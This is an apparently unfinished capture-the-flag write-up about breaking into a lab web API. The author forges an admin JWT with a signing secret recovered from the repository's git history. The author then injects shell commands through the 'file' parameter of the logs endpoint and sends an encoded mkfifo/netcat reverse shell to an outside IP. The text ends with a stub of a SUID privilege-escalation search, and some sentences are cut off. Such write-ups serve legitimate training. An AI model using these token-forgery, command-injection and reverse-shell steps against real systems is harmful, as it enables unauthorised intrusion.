# User

## Enumeration



## Website Enumeration

This is a website of some kind of an open-source API with a live demo mode, which heads to `api/priv`. There is a documentation page, that has a lot of information about how the API works.

First, in the Log In section, there is an example of a log in request with an email and a password and I try to see, if this happens to be a valid admin account.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "root@dasith.works",
"password": "Kekc8swFgD6zU"
}'
```
No luck here unfortunately. 
So I proceed to register a new user, using the information given.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/register' --data '{
"name": "testuser",
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with a succesfull response `{"user":"testuser"}`. I try to log in with these credentials to see that it really works.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with succes and response is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw`. This is the JWT token that authenticates user "testuser".

Now I try to access `api/priv`
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw' -i 'http://10.10.11.120/api/priv
```
and response is `{"role":{"role":"you are normal user","desc":"testuser"}}`. So I logged in as a user, but I need to find an other way to gain access as admin. I'm going to keep looking on the website for any other information, that could be helpful.


I find out tha



![jwtsecret](/img/jwtfake.png)
Then I try to login with forged JWT token with `TOKEN_SECRET=secret`
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.DTKfqkj0GUAI46OLUGTwoOnBEgbQ0PkWk9pVMUz95g4' -i 'http://10.10.11.120/api/priv'
```
But it's rejected. This means, that the token secret has been chenged, before the source code was uploaded.

Look in `.git` and find file `logs/HEAD` with commit history and a commit with description `commit: removed .env for security reasons`
Go back to that commit with:

and login
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/priv'
```

and we're in 
`{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`

```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;whoami'
```

and response `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`

```
curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204242%20%3E%2Ftmp%2Ff'
```

# PrivEsc

`find / -type f -perm -u=s 2>/dev/null`

Find `/opt/count` and visiting `/opt` there is a .c file also.


`strings CoreDump`





